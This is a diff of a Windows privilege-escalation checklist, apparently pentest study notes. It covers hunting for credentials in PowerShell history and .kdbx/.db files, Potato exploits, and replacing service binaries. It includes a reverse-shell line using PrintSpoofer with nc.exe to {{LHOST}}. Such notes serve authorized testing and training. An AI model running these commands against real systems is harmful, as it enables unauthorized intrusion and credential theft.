@@ -3,13 +3,13 @@
 
 0. Run whoami /all 
 1. Look around for creds, log files, (and _run_) .ps1 , .sqlite , .db , .kdbx files 
-2. PowerShell history (C:\Users\user\appdata\roaming\microsoft\windows\powershell\psreadline) 
-3. Potato eg `PrintSpoofer.exe -c "C:\nc.exe {{LHOST}} 443 -e cmd.exe"` 
+2. Look around for unusual programs & services running, and where they store creds 
+3. PowerShell history (C:\Users\user\appdata\roaming\microsoft\windows\powershell\psreadline) 
+4. Potato eg `PrintSpoofer.exe -c "C:\nc.exe {{LHOST}} 443 -e cmd.exe"` 
     - Try Print, god, juicy, rogue, sigma ; also check nc or nc64 
     - FullPowers.exe if missing privileges, some need a CLSID, eg Win Server 2008 TrustedInstaller 
-4. Services (eg `ps` or `sc.exe start|stop dns`) 
-5. Run PowerUp or PrivescCheck (eg `icacls`, replace target exe with cmd, `shutdown /r /t 0`) 
-
+5. Services (eg `ps` or `sc.exe start|stop dns`) 
+6. Run PowerUp or PrivescCheck (eg `icacls`, replace target exe with cmd, `shutdown /r /t 0`) 
 
 
 #### Unusual exploits 
